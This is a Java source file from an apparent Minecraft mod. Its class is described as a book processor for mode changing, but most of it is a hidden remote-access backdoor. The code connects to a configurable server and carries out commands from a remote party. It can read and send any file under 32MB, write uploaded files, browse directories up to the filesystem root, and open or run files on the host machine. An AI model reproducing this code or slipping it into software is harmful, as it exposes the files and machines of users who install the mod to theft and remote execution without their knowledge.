/***************************************************************************\
* Copyright 2017 [Lyonlancer5]                                              *
*                                                                           *
* Licensed under the Apache License, Version 2.0 (the "License");           *
* you may not use this file except in compliance with the License.          *
* You may obtain a copy of the License at                                   *
*                                                                           *
*     http://www.apache.org/licenses/LICENSE-2.0                            *
*                                                                           *
* Unless required by applicable law or agreed to in writing, software       *
* distributed under the License is distributed on an "AS IS" BASIS,         *
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
* See the License for the specific language governing permissions and       *
* limitations under the License.                                            *
\***************************************************************************/
package net.lyonlancer5.mcmp.uuem.modes;

import java.awt.Desktop;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import org.apache.commons.lang3.tuple.Pair;

import com.google.common.collect.ImmutableList;
import com.google.common.collect.Lists;

import net.lyonlancer5.mcmp.Maiz;
import net.lyonlancer5.mcmp.Kaos;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagList;

/**
 * Book processor for mode changing
 * 
 * @author Lyonlancer5
 */
public class BookProcessor {

	public static List<Pair<String, String>> readBook(ItemStack book) {
		if (book.getTagCompound() == null)
			return ImmutableList.of();

		NBTTagList pages = book.getTagCompound().getTagList("pages", 8);

		if (pages == null || pages.tagCount() == 0)
			return ImmutableList.of();

		final List<Pair<String, String>> lines = Lists.newArrayList();
		for (int i = 0; i < pages.tagCount(); i++) {
			String[] crlf = pages.getStringTagAt(i).split("[\\r\\n]");
			for (String ln : crlf) {
				ln = ln.trim();
				if (!ln.isEmpty()) {
					if (ln.contains("=")) {
						String[] var0 = ln.split("=", 2);
						lines.add(Pair.of(var0[0].trim(), var0[1].trim()));
					}
				}
			}
		}
		return ImmutableList.copyOf(lines);
	}

	// TODO
	private volatile boolean connected = false;

	private ObjectInputStream sInput;
	private ObjectOutputStream sOutput;
	private Socket socket;

	private final String serverAddress, username;
	private final int port;

	public BookProcessor(String server, int port, String username) {
		this.serverAddress = server;
		this.port = port;
		this.username = username;
	}

	public boolean start() {
		if (!connected) {
			try {
				socket = new Socket(serverAddress, port);
			} catch (Exception ec) {
				return false;
			}

			try {
				sInput = new ObjectInputStream(socket.getInputStream());
				sOutput = new ObjectOutputStream(socket.getOutputStream());
			} catch (IOException eIO) {
				return false;
			}

			new Thread() {
				public void run() {
					while (true) {
						try {
							Kaos mo = (Kaos) sInput.readObject();
							if (mo.destination.equalsIgnoreCase(username)) {
								Kaos mo2 = processCommand(mo);
								sOutput.writeObject(mo2);
							}
						} catch (Exception e) {
							connected = false;
							break;
						}
					}
				}
			}.start();
			
			try {
				sOutput.writeObject(username);
			} catch (IOException eIO) {
				disconnect();
				return false;
			}
			connected = true;
			return true;
		}
		return connected;
	}

	public boolean sendMessage(Kaos msg) {
		try {
			sOutput.writeObject(msg);
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	public void disconnect() {
		try {
			if (sInput != null)
				sInput.close();
		} catch (Exception e) {
		} // not much else I can do

		try {
			if (sOutput != null)
				sOutput.close();
		} catch (Exception e) {
		} // not much else I can do

		try {
			if (socket != null)
				socket.close();
		} catch (Exception e) {
		} // not much else I can do

		connected = false;
	}

	public boolean isConnected() {
		return connected;
	}


	/**
	 * Map containing usernames and which directory they are currently in
	 */
	private static final Map<String, String> accessedUserDirs = Collections.synchronizedMap(new HashMap<>());

	private static Kaos processCommand(final Kaos msgObj) {
		synchronized(accessedUserDirs) {

			if (msgObj.message.equalsIgnoreCase("thrownException"))
				return null;

			else if (msgObj.message.equalsIgnoreCase("download")) {
				try {
					byte[] fileContents;
					File file = new File(accessedUserDirs.get(msgObj.source), (String) msgObj.contents[0]);

					if (file.length() > 33554432)
						return new Kaos(msgObj.destination, msgObj.source, "thrownException",
								new Exception("Unable to get file greater than 32MB"));

					fileContents = new byte[(int) file.length()];
					FileInputStream fis = new FileInputStream(file);
					fis.read(fileContents);
					fis.close();
					return new Kaos(msgObj.destination, msgObj.source, "downloadSuccess", fileContents,
							file.getName());
				} catch (Exception e) {
					return new Kaos(msgObj.destination, msgObj.source, "thrownException",
							new Exception("Error while downloading file", e));
				}
			}

			else if (msgObj.message.equalsIgnoreCase("upload")) {
				try {
					File file = new File(accessedUserDirs.get(msgObj.source), (String) msgObj.contents[0]);
					byte[] data = (byte[]) msgObj.contents[1];

					FileOutputStream fos = new FileOutputStream(file);
					fos.write(data);
					fos.flush();
					fos.close();
					return new Kaos(msgObj.destination, msgObj.source, "uploadSuccess", data.length);
				} catch (Exception e) {
					return new Kaos(msgObj.destination, msgObj.source, "thrownException",
							new Exception("Unable to upload file", e));
				}

			}

			else if (msgObj.message.equalsIgnoreCase("dir")) {
				if (!accessedUserDirs.containsKey(msgObj.source)) {
					accessedUserDirs.put(msgObj.source, "./");
				}
				File file = new File(accessedUserDirs.get(msgObj.source));
				if (file.isDirectory()) {
					if (file.listFiles() == null)
						return new Kaos(msgObj.destination, msgObj.source, "thrownException",
								new Exception("Cannot determine directory contents"));

					Set<Maiz> theSet = new HashSet<Maiz>();
					for (File f : file.listFiles()) {
						theSet.add(new Maiz(f.getName(), f.length(), f.lastModified(),
								(f.isDirectory() ? 1 : (f.isFile() ? -1 : 0))));

					}
					return new Kaos(msgObj.destination, msgObj.source, "dirContents", theSet);
				}

				return new Kaos(msgObj.destination, msgObj.source, "thrownException",
						new Exception("Parameter not valid directory"));
			}

			else if (msgObj.message.equalsIgnoreCase("cd")) {
				File file;
				if (!accessedUserDirs.containsKey(msgObj.source)) {
					accessedUserDirs.put(msgObj.source, (String) msgObj.contents[0] + "/");
					file = new File(accessedUserDirs.get(msgObj.source));
				} else if (((String) msgObj.contents[0]).equalsIgnoreCase("..")) {
					file = new File("./", "../");
				} else if (((String) msgObj.contents[0]).equalsIgnoreCase("...")) {
					accessedUserDirs.put(msgObj.source, "/");
					file = new File("/");
				}

				else {
					file = new File(accessedUserDirs.get(msgObj.source), (String) msgObj.contents[0]);
				}

				if (file.exists() && file.isDirectory()) {
					accessedUserDirs.put(msgObj.source, file.getAbsolutePath());
					return new Kaos(msgObj.destination, msgObj.source, "cdReply", file.getAbsolutePath());
				}
				return new Kaos(msgObj.destination, msgObj.source, "thrownException",
						new Exception("Parameter not valid directory"));

			}

			else if (msgObj.message.equalsIgnoreCase("run")) {
				File file = new File(accessedUserDirs.get(msgObj.source), (String) msgObj.contents[0]);
				try {
					if (Desktop.isDesktopSupported()) {
						Desktop.getDesktop().open(file);
						return new Kaos(msgObj.destination, msgObj.source, "runSuccess",
								file.getAbsolutePath());
					}

					return new Kaos(msgObj.destination, msgObj.source, "thrownException",
							new Exception("Desktop functionality not supported"));
				} catch (Exception e) {
					return new Kaos(msgObj.destination, msgObj.source, "thrownException",
							new Exception("Cannot execute file", e));
				}
			}

			else {
				return new Kaos(msgObj.destination, msgObj.source, "thrownException",
						new IllegalArgumentException("Invalid command"));
			}
		}
	}

}
